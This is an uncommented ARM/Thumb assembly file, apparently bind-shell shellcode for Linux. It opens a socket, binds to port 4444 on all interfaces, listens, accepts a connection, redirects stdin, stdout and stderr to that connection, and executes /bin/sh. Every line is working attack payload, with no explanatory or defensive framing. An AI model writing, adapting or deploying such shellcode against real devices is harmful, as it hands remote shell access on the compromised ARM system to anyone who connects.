.section .text
.global _start
    _start:
    .ARM
    add r3, pc, #1
    bx r3
    .THUMB
    mov r0, #2
    mov r1, #1
    sub r2, r2, r2
    mov r7, #200
    add r7, #81
    svc #1
    mov r4, r0
    adr  r1, struct_addr
    strb r2, [r1, #1]
    strb r2, [r1, #4]
    strb r2, [r1, #5]
    strb r2, [r1, #6]
    strb r2, [r1, #7]
    mov r2, #16
    add r7, #1 
    svc #1
    nop 
    mov r0, r4
    mov r1, #2        
    add r7, #2
    svc #1
    mov r0, r4
    sub r1, r1, r1
    sub r2, r2, r2
    add r7, #1
    svc #1
    mov r4, r0
    mov r7, #63
    mov r0, r4
    sub r1, r1, r1
    svc #1
    mov r0, r4
    add r1, #1
    svc #1
    mov r0, r4
    add r1, #1
    svc #1
    adr r0, shellcode
    eor r1, r1, r1
    eor r2, r2, r2
    strb r2, [r0, #7]
    mov r7, #11
    svc #1
    nop
struct_addr:
.ascii "\x02\xff"
.ascii "\x11\x5c"
.byte 1,1,1,1
shellcode:
.ascii "/bin/shX"
